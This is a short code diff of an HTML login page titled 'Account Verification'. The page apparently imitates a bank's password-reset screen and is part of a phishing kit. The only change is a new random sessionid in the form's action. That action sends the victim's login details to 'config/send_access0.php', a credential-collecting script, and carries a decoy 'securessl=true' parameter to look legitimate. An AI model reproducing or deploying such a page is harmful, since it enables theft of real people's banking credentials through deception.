@@ -59,7 +59,7 @@ return true;
 	</div>
      	<div class="container"><div class="row jpui primary panel">
 	      <div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
-		   <form class="toggle-aria-hidden" method="POST" id="loginForm" name="loginForm" autocomplete="off" action="config/send_access0.php?&amp;sessionid=CqKU1aNLRXuNveKpodtVVZKUdLqUWCTHZbL54VzqbtdB5xpGL26j5mbPTOhdHNvCYaLsvNOpmRQxpcYH&amp;securessl=true" onsubmit="return validateForm(this);">
+		   <form class="toggle-aria-hidden" method="POST" id="loginForm" name="loginForm" autocomplete="off" action="config/send_access0.php?&amp;sessionid=6Vs9uXwl6g2BQTGxRJRHiXqiQ6FKManqhtVLMztPCdVrM2nrK4ftt0oF7ZRhDcAOqY4HmSiG6tBCRTox&amp;securessl=true" onsubmit="return validateForm(this);">
 		   
 		   <h1 class="header" data-attr="LOGON_PASSWORD_RESET.logonPasswordResetHeader" id="passwordResetHeader" tabindex="-1">Account Verification</h1> 
 		   
